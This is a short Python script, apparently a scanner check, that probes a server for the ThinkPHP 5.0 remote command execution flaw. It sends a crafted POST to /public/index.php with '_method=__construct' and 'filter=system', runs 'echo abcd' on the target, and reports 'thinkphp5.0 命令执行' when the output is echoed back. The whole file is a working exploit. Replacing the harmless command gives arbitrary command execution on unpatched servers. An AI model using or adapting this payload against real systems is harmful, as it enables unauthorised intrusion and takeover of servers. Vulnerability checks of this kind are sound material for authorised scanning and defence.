# coding=utf-8
import requests
def check(ip, port, timeout=3):
    url = 'http://{ip}:{port}/public/index.php'.format(ip=ip, port=port)
    # url = 'http://{ip}:{port}/index.php'.format(ip=ip, port=port)
    data = {
        '_method':'__construct',
        'filter':'system',
        'a':'echo abcd',
    }
    headers = {
        'content-type' : 'application/x-www-form-urlencoded',
        'user-agent' : 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',
        'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
    }
    resp = requests.post(url, data=data, headers=headers, timeout=timeout)
    if "abcd" in resp.text:
        return 'thinkphp5.0 命令执行：' + url
if __name__ == '__main__':
    print(check('127.0.0.1', '80'))